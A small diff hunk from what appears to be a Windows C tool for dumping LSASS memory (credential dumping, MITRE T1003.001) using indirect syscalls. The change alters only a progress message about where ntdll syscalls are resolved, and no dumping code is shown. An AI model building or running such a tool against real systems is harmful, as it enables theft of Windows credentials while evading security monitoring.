@@ -187,7 +187,7 @@ int wmain(int argc, WCHAR* argv[]) {
     wprintf(L"[*] LSASS Dump — T1003.001\n");
 
     // 1. Init indirect syscalls (from clean disk ntdll.dll)
-    wprintf(L"[1] Resolving syscalls from disk ntdll... ");
+    wprintf(L"[1] Resolving syscalls (loaded ntdll.dll)... ");
     if (!InitSyscallResolver()) {
         wprintf(L"FAILED\n"); return 1;
     }
